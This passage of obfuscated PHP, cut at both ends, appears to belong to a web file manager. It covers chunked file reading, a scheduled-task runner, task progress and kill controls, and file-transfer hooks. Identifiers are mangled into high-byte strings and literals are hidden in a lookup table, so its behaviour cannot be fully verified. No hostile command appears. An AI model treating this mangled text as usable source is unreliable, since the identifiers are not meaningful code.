$Éú©èÉ->fileSubstr($‰é£ªÒ, $™ÖäûÄ); } public static function _read($Ö§øúş¥, $–¯Ğî¹¢, $È‚ò™³) { $¹ÍÆ²±™ =& $_SERVER[ÏéâËõ‘]; $Âß™‰¦ = fopen($Ö§øúş¥, $¹ÍÆ²±™[1387]); if (!$Âß™‰¦) { return $¹ÍÆ²±™[12]; } $‘Äüê¨Ó = 8192; fseek($Âß™‰¦, $–¯Ğî¹¢, SEEK_SET); $úœ Â¹ù = $¹ÍÆ²±™[12]; $š¹ ›Œö = 0; while ($š¹ ›Œö < $È‚ò™³) { $òº‘Ğ© = min($‘Äüê¨Ó, $È‚ò™³ - $š¹ ›Œö); $úœ Â¹ù .= fread($Âß™‰¦, $òº‘Ğ©); $š¹ ›Œö += $òº‘Ğ©; } fclose($Âß™‰¦); return $úœ Â¹ù; } public function fileSubstr($µü›æ› , $éÚ˜Ï€) { $‡–ŒÍ±Í =& $_SERVER[ÏéâËõ‘]; $•ï‚©À¹ = $this->info[$‡–ŒÍ±Í[76]]; $×Şİê’¯ = $µü›æ› ; $ş¹àéš¸ = $éÚ˜Ï€; if ($µü›æ›  < 0) { $µü›æ›  = $•ï‚©À¹ + $µü›æ› ; } if ($éÚ˜Ï€ === !1) { $éÚ˜Ï€ = $•ï‚©À¹ - $µü›æ› ; } if ($µü›æ›  + $éÚ˜Ï€ > $•ï‚©À¹) { $éÚ˜Ï€ = $•ï‚©À¹ - $µü›æ› ; } if ($éÚ˜Ï€ <= 0) { return $‡–ŒÍ±Í[12]; } if ($µü›æ›  < 0 || $µü›æ›  >= $•ï‚©À¹ || $éÚ˜Ï€ <= 0 || $éÚ˜Ï€ > 1024 * 1024 * 10) { throw new Exception("\151\x6f\x46\151\154\x65\x52\145\141\144\40\145\162\x72\157\x72\41\x20\x73\x74\x61\162\164\x3d{$µü›æ› }\x3b\x6c\x65\x6e\x67\x74\150\x3d{$éÚ˜Ï€}\x3b\x20\163\x69\172\x65\x3d{$•ï‚©À¹}\73"); } $¼ª´¿¿ = 64 * 1024; $øÕ’Ä‹³ =& self::$_chunkBuffer[$this->path]; if (!$øÕ’Ä‹³) { $øÕ’Ä‹³ = array(); } $ó—ÂşÑæ = 0; $Öş–¿ñ = 0; $›ğÈÕúÆ = $‡–ŒÍ±Í[12]; foreach ($øÕ’Ä‹³ as $ó—ÂşÑæ => $›ğÈÕúÆ) { $ó—ÂşÑæ = intval($ó—ÂşÑæ); $Öş–¿ñ = $ó—ÂşÑæ + strlen($›ğÈÕúÆ); if ($µü›æ›  >= $Öş–¿ñ) { continue; } if ($µü›æ›  >= $ó—ÂşÑæ && $µü›æ›  + $éÚ˜Ï€ <= $Öş–¿ñ) { return substr($›ğÈÕúÆ, $µü›æ›  - $ó—ÂşÑæ, $éÚ˜Ï€); } break; } if (count($øÕ’Ä‹³) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($‡–ŒÍ±Í[1519], $‡–ŒÍ±Í[1520] . count($øÕ’Ä‹³) . "\x3b\x73\x74\141\x72\x74\x3d{$µü›æ› }\54\154\145\x6e\147\x74\x68\75{$éÚ˜Ï€}\x3b\x70\x6f\x73\145\72{$ó—ÂşÑæ}\x7e{$Öş–¿ñ}"); throw new Exception($‡–ŒÍ±Í[1521]); } $Ò¾“û¿ = intval($µü›æ›  / $¼ª´¿¿) * $¼ª´¿¿; $ÀÖÌ‰Ò = ceil(($µü›æ›  + $éÚ˜Ï€) / $¼ª´¿¿) * $¼ª´¿¿ - $Ò¾“û¿; $õî€çŒ£ = IO::fileSubstr($this->path, $Ò¾“û¿, $ÀÖÌ‰Ò); $øÕ’Ä‹³[$Ò¾“û¿ . $‡–ŒÍ±Í[12]] = $õî€çŒ£; ksort($øÕ’Ä‹³); $ö˜Â‡´¦ = substr($õî€çŒ£, $µü›æ›  - $Ò¾“û¿, $éÚ˜Ï€); return $ö˜Â‡´¦; } private function log($Îƒß¿¯, $ü±¢„Õî) { $‰éÊÎ¨ =& $_SERVER[ÏéâËõ‘]; $Ö½˜–¢ = timeFloat() - $this->timeStart; write_log(sprintf($‰éÊÎ¨[1522], $Îƒß¿¯, $this->info[$‰éÊÎ¨[32]], $Ö½˜–¢, $ü±¢„Õî), $‰éÊÎ¨[1188]); } } class Message { function __construct() { } public function send($‘©íŞï = '', $¼¹Ä®Ê = array(), $ç©À®ï¿ = "\x74\145\170\164") { $®øÄƒºø =& $_SERVER[ÏéâËõ‘]; $ÍüÜÆÀÂ = array($®øÄƒºø[33] => $®øÄƒºø[1523], $®øÄƒºø[757] => $‘©íŞï); if (in_array($ç©À®ï¿, array($®øÄƒºø[1523], $®øÄƒºø[1524]))) { $ÍüÜÆÀÂ[$®øÄƒºø[33]] = $ç©À®ï¿; } $¼¹Ä®Ê = array($®øÄƒºø[515] => isset($¼¹Ä®Ê[$®øÄƒºø[515]]) ? $¼¹Ä®Ê[$®øÄƒºø[515]] : $®øÄƒºø[12], $®øÄƒºø[600] => isset($¼¹Ä®Ê[$®øÄƒºø[600]]) ? $¼¹Ä®Ê[$®øÄƒºø[600]] : $®øÄƒºø[12]); if (empty($‘©íŞï) || empty($¼¹Ä®Ê[$®øÄƒºø[515]]) && empty($¼¹Ä®Ê[$®øÄƒºø[600]])) { return !1; } $“‹»Î‰© = array($®øÄƒºø[1464] => $ÍüÜÆÀÂ, $®øÄƒºø[1525] => $¼¹Ä®Ê); Hook::trigger($®øÄƒºø[1526], $“‹»Î‰©); } } goto bô’îáøÕ‚; aêŞœİ…ù”: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $øÏĞ™Ëô =& $_SERVER[ÏéâËõ‘]; if (self::valueGet($øÏĞ™Ëô[752]) != $øÏĞ™Ëô[88]) { return; } if (self::valueGet($øÏĞ™Ëô[1621]) == $øÏĞ™Ëô[88]) { $ÑË¸Èšû = self::valueGet($øÏĞ™Ëô[1622]); if (time() - $ÑË¸Èšû > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); $GLOBALS[$øÏĞ™Ëô[1623]] = 1; self::valueSet($øÏĞ™Ëô[1621], $øÏĞ™Ëô[88]); self::log($øÏĞ™Ëô[1624] . ACTION . $øÏĞ™Ëô[1625]); Session::$data = array(); Session::$sessionSign = $øÏĞ™Ëô[12]; $GLOBALS[$øÏĞ™Ëô[503]] = 1; Hook::bind($øÏĞ™Ëô[1626], $øÏĞ™Ëô[1627]); $ÌÒü‘Úà = 0; while (!0) { self::cacheClear(); if (self::valueGet($øÏĞ™Ëô[752]) != $øÏĞ™Ëô[88]) { self::valueSet($øÏĞ™Ëô[1621], $øÏĞ™Ëô[197]); self::log($øÏĞ™Ëô[1628]); die; } $¢Öñ•° = time(); if ($¢Öñ•° - $ÌÒü‘Úà >= 60) { self::valueSet(array($øÏĞ™Ëô[1621] => $øÏĞ™Ëô[88], $øÏĞ™Ëô[1622] => $¢Öñ•°), !1); $ÌÒü‘Úà = $¢Öñ•°; } if (!file_exists(USER_SYSTEM . $øÏĞ™Ëô[1629])) { self::valueSet(array($øÏĞ™Ëô[1621] => $øÏĞ™Ëô[197], $øÏĞ™Ëô[752] => $øÏĞ™Ëô[197]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $¥àè“ =& $_SERVER[ÏéâËõ‘]; http_close(); self::valueSet($¥àè“[752], $¥àè“[197]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($¥àè“[1621] => $¥àè“[197], $¥àè“[752] => $¥àè“[88]), !1); } public static function taskSwitch() { $èŸ×£¬¢ =& $_SERVER[ÏéâËõ‘]; $”ª¥çÂË = self::valueGet($èŸ×£¬¢[752]) == $èŸ×£¬¢[88] ? $èŸ×£¬¢[197] : $èŸ×£¬¢[88]; self::valueSet($èŸ×£¬¢[752], $”ª¥çÂË); } public static function shutdownEvent() { $²ªş€“· =& $_SERVER[ÏéâËõ‘]; self::valueSet($²ªş€“·[1621], $²ªş€“·[197]); self::log($²ªş€“·[1630]); } public static function config($àŒÍÄ, $Ëôãë—¨) { self::valueSet($_SERVER[ÏéâËõ‘][752], $àŒÍÄ); } private static function taskRunAll() { $çŠ–Ú =& $_SERVER[ÏéâËõ‘]; $Ø¯íŠÀÜ = timeFloat(); $ôˆ×Ôâñ = Model($çŠ–Ú[1631])->listData(); $â‘®Ğçè = count($ôˆ×Ôâñ); for ($Œ½±œ× = 0; $Œ½±œ× < $â‘®Ğçè; $Œ½±œ×++) { $……Ç = $ôˆ×Ôâñ[$Œ½±œ×]; if (!$……Ç[$çŠ–Ú[399]] || $……Ç[$çŠ–Ú[1632]] != $çŠ–Ú[88]) { continue; } if (!self::taskTimeCheck($……Ç)) { continue; } self::taskRun($……Ç); } Hook::trigger($çŠ–Ú[1633]); self::taskQueueRun($Ø¯íŠÀÜ); } private static function taskQueueRun($ğ©ºş®Î) { $ÎæÜıî… = 10; while (!0) { $»«Ğ²õ¬ = TaskQueue::run(); if ($»«Ğ²õ¬ === !1) { break; } if (timeFloat() - $ğ©ºş®Î >= $ÎæÜıî…) { break; } } } private static function taskTimeCheck($ÇÙéÖß) { $š¤š¶Ç =& $_SERVER[ÏéâËõ‘]; $î©õüñÁ = json_decode($ÇÙéÖß[$š¤š¶Ç[203]], !0); $´ ÔÙ²£ = intval($ÇÙéÖß[$š¤š¶Ç[1622]]); $éÏš¤šñ = strtotime($š¤š¶Ç[1634] . $î©õüñÁ[$š¤š¶Ç[1635]] . $š¤š¶Ç[1636]) - strtotime($š¤š¶Ç[1637]); $¥“÷ÇåÄ = time() - strtotime(date($š¤š¶Ç[1638]) . $š¤š¶Ç[1639]); $±½ãàÚ£ = $¥“÷ÇåÄ >= $éÏš¤šñ && $¥“÷ÇåÄ <= $éÏš¤šñ + 3600; switch ($î©õüñÁ[$š¤š¶Ç[33]]) { case $š¤š¶Ç[1640]: if (time() - $´ ÔÙ²£ < 3600 * 24 * 30) { return !1; } if ($î©õüñÁ[$š¤š¶Ç[1640]] == date($š¤š¶Ç[1641]) && $±½ãàÚ£) { return !0; } break; case $š¤š¶Ç[1642]: if (time() - $´ ÔÙ²£ < 3600 * 24 * 7) { return !1; } $şŸ›»ï± = date($š¤š¶Ç[1643]) == 0 ? 7 : date($š¤š¶Ç[1643]); if ($î©õüñÁ[$š¤š¶Ç[1642]] == $şŸ›»ï± && $±½ãàÚ£) { return !0; } break; case $š¤š¶Ç[1635]: if (time() - $´ ÔÙ²£ < 3600 * 24) { return !1; } if ($±½ãàÚ£) { return !0; } break; case $š¤š¶Ç[1644]: if (time() - $´ ÔÙ²£ >= floatval($î©õüñÁ[$š¤š¶Ç[1644]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $ÕÔÁ¾â¤ =& $_SERVER[ÏéâËõ‘]; static $ ÖÍÍ·¾ = 0; $‚³Ï²Â¾ = 300; if (!$ ÖÍÍ·¾) { $ ÖÍÍ·¾ = time(); } if (time() - $ ÖÍÍ·¾ < $‚³Ï²Â¾) { return; } $ ÖÍÍ·¾ = time(); $ğ¹ÏŸÙ¹ = Model($ÕÔÁ¾â¤[513])->db($ÕÔÁ¾â¤[12]); if ($ğ¹ÏŸÙ¹) { $ğ¹ÏŸÙ¹->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($ÕÔÁ¾â¤[1645], $ÕÔÁ¾â¤[1646]); die; } } public static function taskRun($ñóÒÕ×) { $Ï´¿µƒ =& $_SERVER[ÏéâËõ‘]; self::log($Ï´¿µƒ[1647] . $ñóÒÕ×[$Ï´¿µƒ[399]] . $Ï´¿µƒ[1648] . $ñóÒÕ×[$Ï´¿µƒ[32]] . $Ï´¿µƒ[1649] . $ñóÒÕ×[$Ï´¿µƒ[1650]]); Model($Ï´¿µƒ[1631])->run($ñóÒÕ×[$Ï´¿µƒ[399]]); $«°ÛŞŠ³ = timeFloat(); $—Ÿ²³«– = $Ï´¿µƒ[12]; switch ($ñóÒÕ×[$Ï´¿µƒ[33]]) { case $Ï´¿µƒ[307]: $Õ÷ù¯ú = url_request($ñóÒÕ×[$Ï´¿µƒ[1650]], $Ï´¿µƒ[230], !1, !1, !1, !1, 10); if ($Õ÷ù¯ú[$Ï´¿µƒ[752]]) { $—Ÿ²³«– = strlen($Õ÷ù¯ú[$Ï´¿µƒ[1198]]); } break; case $Ï´¿µƒ[229]: $—Ÿ²³«– = Hook::apply($ñóÒÕ×[$Ï´¿µƒ[1650]]); default: break; } Model($Ï´¿µƒ[1651])->add(array($Ï´¿µƒ[1652] => $Ï´¿µƒ[12], $Ï´¿µƒ[1653] => $Ï´¿µƒ[197], $Ï´¿µƒ[33] => $Ï´¿µƒ[1654] . $ñóÒÕ×[$Ï´¿µƒ[399]], $Ï´¿µƒ[1655] => json_encode(array($Ï´¿µƒ[32] => $ñóÒÕ×[$Ï´¿µƒ[32]], $Ï´¿µƒ[1656] => timeFloat() - $«°ÛŞŠ³, $Ï´¿µƒ[293] => $—Ÿ²³«–)))); $ı¢ÉÉóË = $—Ÿ²³«– ? $Ï´¿µƒ[1657] . $—Ÿ²³«– : $Ï´¿µƒ[12]; self::log($Ï´¿µƒ[1658] . $ñóÒÕ×[$Ï´¿µƒ[399]] . $Ï´¿µƒ[164] . $ı¢ÉÉóË); return !0; } private static function valueGet($Ë¾ä˜ªÍ) { $Ã†÷Ä¼é =& $_SERVER[ÏéâËõ‘]; $®¬•®¥† = $Ã†÷Ä¼é[1659]; $¼¹¢¢ù– = Model($Ã†÷Ä¼é[435])->get($Ë¾ä˜ªÍ, $®¬•®¥†); if (is_null($¼¹¢¢ù–)) { Model($Ã†÷Ä¼é[435])->set($Ã†÷Ä¼é[752], $Ã†÷Ä¼é[88], $®¬•®¥†); Model($Ã†÷Ä¼é[435])->set($Ã†÷Ä¼é[1621], $Ã†÷Ä¼é[197], $®¬•®¥†); $¼¹¢¢ù– = Model($Ã†÷Ä¼é[435])->get($Ë¾ä˜ªÍ, $®¬•®¥†); } return $¼¹¢¢ù–; } private static function valueSet($„ü€½ÙÌ, $Àâ§İ¶) { $Á‰ü˜Ğß =& $_SERVER[ÏéâËõ‘]; $ÊîèÜé = $Á‰ü˜Ğß[1660]; CacheLock::lock($ÊîèÜé); $äã²ğü¢ = Model($Á‰ü˜Ğß[435])->set($„ü€½ÙÌ, $Àâ§İ¶, $Á‰ü˜Ğß[1659]); CacheLock::unlock($ÊîèÜé); return $äã²ğü¢; } protected static function log($æªë§ë) { write_log($æªë§ë, $_SERVER[ÏéâËõ‘][1646]); } private static function cacheClear() { $÷é›à‡ =& $_SERVER[ÏéâËõ‘]; Cache::clearMemory(Model($÷é›à‡[435])->cacheKey($÷é›à‡[1659])); Cache::clearMemory(Model($÷é›à‡[435])->cacheKey($÷é›à‡[1661])); Model($÷é›à‡[1631])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\x73\x74\157\x70"; const STATYS_RUNNING = "\x72\x75\x6e\156\x69\156\x67"; const STATYS_KILL = "\153\x69\x6c\154"; public $task; public function __destruct() { $this->end(); } public function __construct($–ØÎ²é, $µòÌµüˆ = '', $¿„’‹ä = 0, $º¸éæˆİ = '') { $Ä£áĞİô =& $_SERVER[ÏéâËõ‘]; if (self::get($–ØÎ²é)) { return; } $this->task = array($Ä£áĞİô[399] => $–ØÎ²é, $Ä£áĞİô[1662] => USER_ID, $Ä£áĞİô[1561] => $º¸éæˆİ, $Ä£áĞİô[33] => $µòÌµüˆ, $Ä£áĞİô[1069] => $Ä£áĞİô[12], $Ä£áĞİô[788] => $¿„’‹ä, $Ä£áĞİô[1663] => 0, $Ä£áĞİô[1664] => 0, $Ä£áĞİô[1665] => 0, $Ä£áĞİô[1666] => timeFloat(), $Ä£áĞİô[1667] => 0, $Ä£áĞİô[1668] => 0, $Ä£áĞİô[1669] => 0, $Ä£áĞİô[1670] => 0, $Ä£áĞİô[752] => $Ä£áĞİô[1621]); $GLOBALS[$Ä£áĞİô[1671]] = 1; Hook::bind($Ä£áĞİô[1626], array($this, $Ä£áĞİô[1672])); Hook::bind($Ä£áĞİô[1673], array($this, $Ä£áĞİô[1674])); $this->startAfter(); Hook::trigger($Ä£áĞİô[1675], $this->task); $this->task[$Ä£áĞİô[1668]] = timeFloat(); } public function end() { $°ıîİÅ‘ =& $_SERVER[ÏéâËõ‘]; if (!$this->task) { return; } if ($this->task[$°ıîİÅ‘[1668]]) { self::valueSet($this->task[$°ıîİÅ‘[399]], !1); } $š´ëåÆ¾ = timeFloat() - $this->task[$°ıîİÅ‘[1666]]; self::log($°ıîİÅ‘[1676] . $this->task[$°ıîİÅ‘[399]] . $°ıîİÅ‘[1677] . $š´ëåÆ¾ . $°ıîİÅ‘[1678]); Hook::unbind($°ıîİÅ‘[1626], array($this, $°ıîİÅ‘[1672])); Hook::unbind($°ıîİÅ‘[1673], array($this, $°ıîİÅ‘[1674])); $this->endAfter(); $this->task = !1; } public function update($á¤ÔÓÙ· = 0, $á”îºò’ = false) { $¨Üçß =& $_SERVER[ÏéâËõ‘]; $Âš©­¤ =& $this->task; if (!$Âš©­¤) { return; } $Âš©­¤[$¨Üçß[1663]] += $á¤ÔÓÙ·; $Âš©­¤[$¨Üçß[1667]] = timeFloat(); if ($Âš©­¤[$¨Üçß[788]]) { if ($Âš©­¤[$¨Üçß[788]] < $Âš©­¤[$¨Üçß[1663]]) { $Âš©­¤[$¨Üçß[788]] = $Âš©­¤[$¨Üçß[1663]]; } $ÃÖ´Î¸© = timeFloat() - $Âš©­¤[$¨Üçß[1666]] - $Âš©­¤[$¨Üçß[1669]]; if ($ÃÖ´Î¸© <= 0) { $ÃÖ´Î¸© = 0.001; } $Âš©­¤[$¨Üçß[1664]] = $Âš©­¤[$¨Üçß[1663]] / $Âš©­¤[$¨Üçß[788]]; $Âš©­¤[$¨Üçß[1665]] = $Âš©­¤[$¨Üçß[1663]] / $ÃÖ´Î¸©; if ($Âš©­¤[$¨Üçß[1664]] > 0) { $Âš©­¤[$¨Üçß[1670]] = $ÃÖ´Î¸© * (1 - $Âš©­¤[$¨Üçß[1664]]) / $Âš©­¤[$¨Üçß[1664]]; } $Âš©­¤[$¨Üçß[1670]] = $Âš©­¤[$¨Üçß[1670]] <= 0 ? 0 : $Âš©­¤[$¨Üçß[1670]]; } $this->updateAfter(); $©ÚèŠë = 0.2; if (timeFloat() - $Âš©­¤[$¨Üçß[1668]] < $©ÚèŠë && !$á”îºò’) { return; } $†›œÄÏ = self::get($Âš©­¤[$¨Üçß[399]]); $·¬‹ËÔ = $†›œÄÏ[$¨Üçß[752]]; if ($·¬‹ËÔ == self::STATYS_KILL) { $‰İü±Ÿ² = array($¨Üçß[1679] => LNG($¨Üçß[1680]), $¨Üçß[1196] => !1); Cache::set($¨Üçß[1681] . $this->task[$¨Üçß[399]], $‰İü±Ÿ², 30); $this->onKill(); $this->end(); die; } else { if ($·¬‹ËÔ == self::STATYS_STOP) { $¥‰é®ô = 2; $†›œÄÏ[$¨Üçß[1669]] += $¥‰é®ô; self::valueSet($Âš©­¤[$¨Üçß[399]], $†›œÄÏ); sleep($¥‰é®ô); $this->update(); return; } } $Âš©­¤[$¨Üçß[752]] = $·¬‹ËÔ ? $·¬‹ËÔ : $Âš©­¤[$¨Üçß[752]]; $Âš©­¤[$¨Üçß[1669]] = $†›œÄÏ[$¨Üçß[1669]] ? $†›œÄÏ[$¨Üçß[1669]] : 0; $Âš©­¤[$¨Üçß[1668]] = timeFloat(); Hook::trigger($¨Üçß[1682], $Âš©­¤); self::valueSet($Âš©­¤[$¨Üçß[399]], $Âš©­¤); } public function onKillSet($çû€Æ§‚, $õâ”„Œ´ = array()) { $this->onKillCall = array($çû€Æ§‚, $õâ”„Œ´); } public function onKill() { $Îë¦… ¬ =& $_SERVER[ÏéâËõ‘]; self::log($Îë¦… ¬[1676] . $this->task[$Îë¦… ¬[399]] . $Îë¦… ¬[1683]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($‹ûô‘ıÊ) { $Éóæ’ú½ =& $_SERVER[ÏéâËõ‘]; Cache::set($Éóæ’ú½[1681] . $this->task[$Éóæ’ú½[399]], $‹ûô‘ıÊ, 60); return $‹ûô‘ıÊ; } public static function get($ıÄŸÏ˜µ) { $—Æìîº =& $_SERVER[ÏéâËõ‘]; $¥ü¾Ã‘ = self::valueGet($ıÄŸÏ˜µ); if (is_array($¥ü¾Ã‘) && $¥ü¾Ã‘[$—Æìîº[1684]]) { $Ù¦¸×²Ú = ActionApply($¥ü¾Ã‘[$—Æìîº[1684]], array($¥ü¾Ã‘)); $¥ü¾Ã‘ = is_array($Ù¦¸×²Ú) ? $Ù¦¸×²Ú : $¥ü¾Ã‘; } return $¥ü¾Ã‘; } public static function listData() { $äŒÑÃúã = self::valueGet(); return array_sort_by($äŒÑÃúã, $_SERVER[ÏéâËõ‘][1666], !0); } public static function kill($•Î³õ² ) { return self::changeStatus($•Î³õ² , self::STATYS_KILL); } public static function stop($İˆ€ıØØ) { return self::changeStatus($İˆ€ıØØ, self::STATYS_STOP); } public static function restart($âëÈÀ¢) { return self::changeStatus($âëÈÀ¢, self::STATYS_RUNNING); } public static function killAll() { $°µ€ñ§µ =& $_SERVER[ÏéâËõ‘]; $¬©¬©¢å = self::listData(); foreach ($¬©¬©¢å as $—É¯÷åÇ) { self::kill($—É¯÷åÇ[$°µ€ñ§µ[399]]); } sleep(2); foreach ($¬©¬©¢å as $—É¯÷åÇ) { self::valueSet($—É¯÷åÇ[$°µ€ñ§µ[399]], !1); } } private static function changeStatus($ò€èö, $˜öÁİãé) { $î§åâã =& $_SERVER[ÏéâËõ‘]; $¾‚˜ÛÏ™ = self::valueGet($ò€èö); if (!$¾‚˜ÛÏ™) { return !1; } $¾‚˜ÛÏ™[$î§åâã[752]] = $˜öÁİãé; self::valueSet($ò€èö, $¾‚˜ÛÏ™); self::log($î§åâã[1685] . $¾‚˜ÛÏ™[$î§åâã[399]] . $î§åâã[1686] . $˜öÁİãé); return !0; } public static function valueGet($‰¤Ê¸×ç = false) { $é©ı¹Ü› =& $_SERVER[ÏéâËõ‘]; if ($‰¤Ê¸×ç) { $‚‚„”™° = Model($é©ı¹Ü›[447])->where(array($é©ı¹Ü›[94] => $‰¤Ê¸×ç, $é©ı¹Ü›[33] => $é©ı¹Ü›[1076]))->find(); return $‚‚„”™° ? json_decode($‚‚„”™°[$é©ı¹Ü›[374]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($ÕÍºò—” = false) { $ÔäÜ¸˜Š =& $_SERVER[ÏéâËõ‘]; $¥÷ú…ÂÚ = array($ÔäÜ¸˜Š[33] => $ÔäÜ¸˜Š[1076]); if ($ÕÍºò—”) { $¥÷ú…ÂÚ[$ÔäÜ¸˜Š[1662]] = $ÕÍºò—”; } $­Ñä÷˜µ = Model($ÔäÜ¸˜Š[447])->where($¥÷ú…ÂÚ)->select(); $­Ñä÷˜µ = $­Ñä÷˜µ ? $­Ñä÷˜µ : array(); foreach ($­Ñä÷˜µ as $†¯ï§Ïı => $øÏœ«ô¾) { $­Ñä÷˜µ[$†¯ï§Ïı] = json_decode($øÏœ«ô¾[$ÔäÜ¸˜Š[374]], !0); } return $­Ñä÷˜µ; } public static function valueSet($õÂ¿€è, $ˆóì±úÌ) { $½¨¶¦Ãı =& $_SERVER[ÏéâËõ‘]; if (!$ˆóì±úÌ) { return Model($½¨¶¦Ãı[447])->where(array($½¨¶¦Ãı[94] => $õÂ¿€è, $½¨¶¦Ãı[33] => $½¨¶¦Ãı[1076]))->delete(); } $‰ù·°ƒ‚ = json_encode($ˆóì±úÌ); if (!$‰ù·°ƒ‚) { ob_start(); var_dump($ˆóì±úÌ); $¯¾”ïÙ = ob_get_clean(); self::log($½¨¶¦Ãı[1687] . json_encode_force($¯¾”ïÙ)); } if (!$õÂ¿€è || !$ˆóì±úÌ[$½¨¶¦Ãı[399]]) { return !1; } $™Ç¢şŞÆ = array($½¨¶¦Ãı[33] => $½¨¶¦Ãı[1076], $½¨¶¦Ãı[1662] => USER_ID, $½¨¶¦Ãı[94] => $õÂ¿€è, $½¨¶¦Ãı[374] => $‰ù·°ƒ‚); $¬Öìßª = $½¨¶¦Ãı[1688]; CacheLock::lock($¬Öìßª); Model($½¨¶¦Ãı[447])->add($™Ç¢şŞÆ, array(), !0); CacheLock::unlock($¬Öìßª); } public static function log($è¾Õù«©) { if (!GLOBAL_DEBUG) { return; } write_log($è¾Õù«©, $_SERVER[ÏéâËõ‘][1689]); } } class TaskFileTransfer extends Task { protected function startAfter() { $ş¨ ö‰â =& $_SERVER[ÏéâËõ‘]; $¼Çş¿ı† =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($ş¨ ö‰â[1690], array($this, $ş¨ ö‰â[1691])); Hook::bind($ş¨ ö‰â[1220], array($this, $ş¨ ö‰â[1692])); Hook::bind($ş¨ ö‰â[1693], array($this, $ş¨ ö‰â[1694])); Hook::bind($ş¨ ö‰â[604], array($this, $ş¨ ö‰â[1695])); Hook::bind($ş¨ ö‰â[605], array($this, $ş¨ ö‰â[1696])); Hook::bind($ş¨ ö‰â[610], array($this, $ş¨ ö‰â[1697])); Hook::bind($ş¨ ö‰â[611], array($this, $ş¨ ö‰â[1698])); Hook::bind($ş¨ ö‰â[607], array($this, $ş¨ ö‰â[1699])); Hook::bind($ş¨ ö‰â[608], array($this, $ş¨ ö‰â[1700])); Hook::bind($ş¨ ö‰â[574], array($this, $ş¨ ö‰â[1701])); Hook::bind($ş¨ ö‰â[571], array($this, $ş¨ ö‰â[1701])); Hook::bind($ş¨ ö‰â[576], array($this, $ş¨ ö‰â[1701])); Hook::bind($ş¨ ö‰â[578], array($this, $ş¨ ö‰â[1701])); Hook::bind($ş¨ ö‰â[580], array($this, $ş¨ ö‰â[1701])); Hook::bind($ş¨ ö‰â[1702], array($this, $ş¨ ö‰â[1703])); Hook::bind($ş¨ ö‰â[597], array($this, $ş¨ ö‰â[1704])); $this->sourceModelCopyFlag = !1; Hook::bind($ş¨ ö‰â[1705], array($this, $ş¨ ö‰â[1706])); Hook::bind($ş¨ ö‰â[1707], array($this, $ş¨ ö‰â[1708])); Hook::bind($ş¨ ö‰â[1709], array($this, $ş¨ ö‰â[1710])); $¼Çş¿ı†[$ş¨ ö‰â[1711]] = LNG($ş¨ ö‰â[1712]); $¼Çş¿ı†[$ş¨ ö‰â[1713]] = 0; $¼Çş¿ı†[$ş¨ ö‰â[1714]] = 0; $¼Çş¿ı†[$ş¨ ö‰â[1069]] = $ş¨ ö‰â[12]; $¼Çş¿ı†[$ş¨ ö‰â[1715]] = $ş¨ ö‰â[12]; $¼Çş¿ı†[$ş¨ ö‰â[1716]] = 0; $¼Çş¿ı†[$ş¨ ö‰â[1717]] = 0; $¼Çş¿ı†[$ş¨ ö‰â[1718]] = 0; if (!$¼Çş¿ı†[$ş¨ ö‰â[1561]]) { $¼Çş¿ı†[$ş¨ ö‰â[1561]] = LNG($ş¨ ö‰â[1719]); } } protected function endAfter() { $õ¿üÊà¬ =& $_SERVER[ÏéâËõ‘]; Hook::unbind($õ¿üÊà¬[1690], array($this, $õ¿üÊà¬[1691])); Hook::unbind($õ¿üÊà¬[1220], array($this, $õ¿üÊà¬[1692])); Hook::unbind($õ¿üÊà¬[1693], array($this, $õ¿üÊà¬[1694])); Hook::unbind($õ¿üÊà¬[604], array($this, $õ¿üÊà¬[1695])); Hook::unbind($õ¿üÊà¬[605], array($this, $õ¿üÊà¬[1696])); Hook::unbind($õ¿üÊà¬[610], array($this, $õ¿üÊà¬[1697])); Hook::unbind($õ¿üÊà¬[611], array($this, $õ¿üÊà¬[1698])); Hook::unbind($õ¿üÊà¬[607], array($this, $õ¿üÊà¬[1699])); Hook::unbind($õ¿üÊà¬[608], array($this, $õ¿üÊà¬[1700])); Hook::unbind($õ¿üÊà¬[574], array($this, $õ¿üÊà¬[1701])); Hook::unbind($õ¿üÊà¬[571], array($this, $õ¿üÊà¬[1701])); Hook::unbind($õ¿üÊà¬[576], array($this, $õ¿üÊà¬[1701])); Hook::unbind($õ¿üÊà¬[578], array($this, $õ¿üÊà¬[1701])); Hook::unbind($õ¿üÊà¬[580], array($this, $õ¿üÊà¬[1701])); Hook::unbind($õ¿üÊà¬[1702], array($this, $õ¿üÊà¬[1703])); Hook::unbind($õ¿üÊà¬[597], array($this, $õ¿üÊà¬[1704])); Hook::unbind($õ¿üÊà¬[1705], array($this, $õ¿üÊà¬[1706])); Hook::unbind($õ¿üÊà¬[1707], array($this, $õ¿üÊà¬[1708])); Hook::unbind($õ¿üÊà¬[1709], array($this, $õ¿üÊà¬[1710])); } public function copyMoveStart($Å›ãº±š, $¢¢‘Öõê, $›–­ì®Ô, $²‚€ëÙ) { $ª¿¹ı¸® =& $_SERVER[ÏéâËõ‘]; self::log($ª¿¹ı¸®[1720] . $¢¢‘Öõê . $ª¿¹ı¸®[70] . $²‚€ëÙ); $Â ›Ïãú = rtrim(TEMP_FILES, $ª¿¹ı¸®[8]); if (substr($¢¢‘Öõê, 0, strlen($Â ›Ïãú)) == $Â ›Ïãú) { return; } if (substr($²‚€ëÙ, 0, strlen($Â ›Ïãú)) == $Â ›Ïãú) { return; } $¸‡Ş‚€Ğ =& $this->task; $¸‡Ş‚€Ğ[$ª¿¹ı¸®[1721]] = KodIO::transferType($Å›ãº±š, $›–­ì®Ô); $this->update(); } public function updateAfter() { $²óÄ–ÒÛ =& $_SERVER[ÏéâËõ‘]; $¾©µÄÓ =& $this->task; if 